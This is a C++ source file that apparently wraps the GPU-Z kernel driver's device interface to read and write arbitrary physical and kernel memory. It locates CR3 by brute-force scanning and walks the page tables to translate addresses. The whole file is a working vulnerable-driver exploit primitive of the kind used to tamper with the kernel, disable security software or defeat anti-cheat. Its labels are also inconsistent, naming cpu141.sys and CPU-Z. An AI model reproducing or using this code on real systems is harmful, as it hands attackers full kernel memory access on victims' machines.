#include "Global.h"

#define IOCTL_CR 0x9C402428
#define IOCTL_READ 0x9C402420
#define IOCTL_WRITE 0x9C402430

#define CTL_GET_VALUE 0x8000645C
#define CTL_RELEASE_MDL 0x80006460

#define gpuz_NAME "\\\\.\\gpuz"

#define LODWORD(l)       ((DWORD)(((DWORD_PTR)(l)) & 0xffffffff))
#define HIDWORD(l)       ((DWORD)((((DWORD_PTR)(l)) >> 32) & 0xffffffff))

typedef struct _InputRead
{
	uint64_t dwAddress;
	uint32_t dwLength;
}InputRead, *PInputRead;

typedef struct _InputWrite
{
	uint64_t dwAddress;
	uint32_t dwLength;
}InputWrite, *PInputWrite;

typedef struct _Output
{
	uint32_t Operation;
	uint32_t dwBufferLow;
}Output, *POutput;

gpuz::gpuz()
{
	hDevice = CreateFile(gpuz_NAME, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("Could Not Open cpu141.sys .\n");
		getchar();
	}

	if (!ReadCR3())
	{
		printf("readcr3 failed\n");
		getchar();
	}


}

gpuz::~gpuz()
{
	CloseHandle(hDevice);
}



uint64_t gpuz::TranslateVirtualAddress(uint64_t directoryTableBase, PVOID virtualAddress)
{
	auto va = (uint64_t)virtualAddress;

	auto PML4 = (USHORT)((va >> 39) & 0x1FF); //<! PML4 Entry Index
	auto DirectoryPtr = (USHORT)((va >> 30) & 0x1FF); //<! Page-Directory-Pointer Table Index
	auto Directory = (USHORT)((va >> 21) & 0x1FF); //<! Page Directory Table Index
	auto Table = (USHORT)((va >> 12) & 0x1FF); //<! Page Table Index

											   // 
											   // Read the PML4 Entry. DirectoryTableBase has the base address of the table.
											   // It can be read from the CR3 register or from the kernel process object.
											   // 
	auto PML4E = ReadPhysicalAddress<uint64_t>(directoryTableBase + PML4 * sizeof(ULONGLONG));

	if (PML4E == 0)
		return 0;

	// 
	// The PML4E that we read is the base address of the next table on the chain,
	// the Page-Directory-Pointer Table.
	// 
	auto PDPTE = ReadPhysicalAddress<uint64_t>((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(ULONGLONG));

	if (PDPTE == 0)
		return 0;

	//Check the PS bit
	if ((PDPTE & (1 << 7)) != 0) {
		// If the PDPTE’s PS flag is 1, the PDPTE maps a 1-GByte page. The
		// final physical address is computed as follows:
		// ?Bits 51:30 are from the PDPTE.
		// ?Bits 29:0 are from the original va address.
		return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
	}

	//
	// PS bit was 0. That means that the PDPTE references the next table
	// on the chain, the Page Directory Table. Read it.
	// 
	auto PDE = ReadPhysicalAddress<uint64_t>((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(ULONGLONG));

	if (PDE == 0)
		return 0;

	if ((PDE & (1 << 7)) != 0) {
		// If the PDE’s PS flag is 1, the PDE maps a 2-MByte page. The
		// final physical address is computed as follows:
		// ?Bits 51:21 are from the PDE.
		// ?Bits 20:0 are from the original va address.
		return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
	}

	//
	// PS bit was 0. That means that the PDE references a Page Table.
	// 
	auto PTE = ReadPhysicalAddress<uint64_t>((PDE & 0xFFFFFFFFFF000) + Table * sizeof(ULONGLONG));

	if (PTE == 0)
		return 0;

	//
	// The PTE maps a 4-KByte page. The
	// final physical address is computed as follows:
	// ?Bits 51:12 are from the PTE.
	// ?Bits 11:0 are from the original va address.
	return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
}

/* CR3 Is The Table Base Of The Process Memory Page */
BOOLEAN gpuz::ReadCR3()
{
	DWORD Data[10] = { 0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa };
	DWORD res[10] = {0};

	int j = 0;
	ULONG64 i = 0;
	for (i = 0x100000; i < 0xffffff000; i += 0x1000)
	{
		if(i%0x10000000==0)
			printf("0x%016I64x\n", i);
		ControlReg3 = i;
		ReadSystemAddress((PVOID)Data, (PVOID)res, 40);
		for (j = 0; j < 10; j++)
		{
			//printf("DATA[%d]=%x\n", j, Data[j]);
			//printf("res[%d]=%x\n", j, res[j]);
			if (Data[j] == res[j])
				continue;
			else
				break;
		} 
		if (j == 10)
			break;
		else
			continue;
	}
	if (i < 0xffffff000)
	{
		printf("0x%016I64x\n", i);
		printf("found cr3\n");
		return true;
	}
	else
	{
		printf("cr3 not found\n");
		getchar();
		return false;
	}
		
}

/* Read Physical Address Using CPU-Z */
BOOLEAN gpuz::ReadPhysicalAddress(uint64_t Address, PVOID buffer, SIZE_T Length)
{
	DWORD BytesRet = 0;
	InputRead in{ 0 };
	Output out{ 0 };
	if (Address == 0 || buffer == nullptr)
		return false;
	if (Address > 0x400000000)
		return false;
	in.dwAddress = Address;
	in.dwLength = Length;
	int value=0;
	if (!DeviceIoControl(hDevice, CTL_GET_VALUE, &in.dwAddress, 12, &value, 4, &BytesRet, nullptr))
		return false;
	else
	{
		for (int i = 0; i < in.dwLength; i++)
		{
			*((char*)buffer + i) = *((char*)value + i);
		}
	}
	if (!DeviceIoControl(hDevice, CTL_RELEASE_MDL,
		&value,
		4,
		NULL,
		0,
		&BytesRet,
		NULL))
	{
		printf("release mdl failed\n");
	}
	return true;
}

/* Translate Virtual Address To Physical Using CR3, then Read It */
BOOLEAN gpuz::ReadSystemAddress(PVOID Address, PVOID buf, SIZE_T len)
{
	uint64_t phys = TranslateVirtualAddress(ControlReg3, Address);
	return ReadPhysicalAddress(phys, buf, len);
}

/* Write Physical Address Using CPU-Z */
BOOLEAN gpuz::WritePhysicalAddress(uint64_t Address, PVOID buffer, SIZE_T Length)
{
	if (Length % 4 != 0 || Length == 0)			// Can Only Write Lengths That Are A Multiple Of 4
	{
		printf("write length wrong\n");
		return false;
	}
	if (Address > 0x400000000)
		return false;
	DWORD BytesRet = 0;
	InputRead in{ 0 };
	Output out{ 0 };
	in.dwAddress = Address;
	in.dwLength = Length;
	int value = 0;
	if (!DeviceIoControl(hDevice, CTL_GET_VALUE, &in.dwAddress, 12, &value, 4, &BytesRet, nullptr))
	{
		return false;
	}
	else
	{
		for (int i = 0; i < in.dwLength; i++)
		{
			*((char*)value + i) = *((char*)buffer + i);
		}
	}
	if (!DeviceIoControl(hDevice, CTL_RELEASE_MDL,
		&value,
		4,
		NULL,
		0,
		&BytesRet,
		NULL))
	{
		printf("release mdl failed\n");
	}
	return true;
}

/* Translate Virtual Address To Physical Using CR3, then Write It */
BOOLEAN gpuz::WriteSystemAddress(PVOID Address, PVOID buffer, SIZE_T Length)
{
	uint64_t phys = TranslateVirtualAddress(ControlReg3, Address);
	return WritePhysicalAddress(phys, buffer, Length);
}